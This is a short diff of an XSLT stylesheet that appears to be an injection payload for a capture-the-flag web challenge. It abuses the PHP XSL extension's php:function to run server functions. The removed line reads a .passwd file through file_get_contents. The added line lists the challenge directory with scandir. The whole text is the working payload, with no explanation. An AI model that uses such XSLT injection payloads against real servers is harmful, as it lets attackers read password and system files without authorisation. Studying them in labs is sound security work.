@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <html xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" xsl:version="1.0">
 <body style="font-family:Arial;font-size:9pt;background-color:#AABBCC">
-<xsl:variable name="header"  select="php:function('file_get_contents','/challenge/web-serveur/ch50/.passwd')"/>
+<xsl:element name="header"  select="php:function('scandir','/challenge/web-serveur/ch50')"/>
 <xsl:for-each select="beers/beer">
 <div style="background-color:teal;color:white;padding:4px">
 <span style="font-weight:bold">
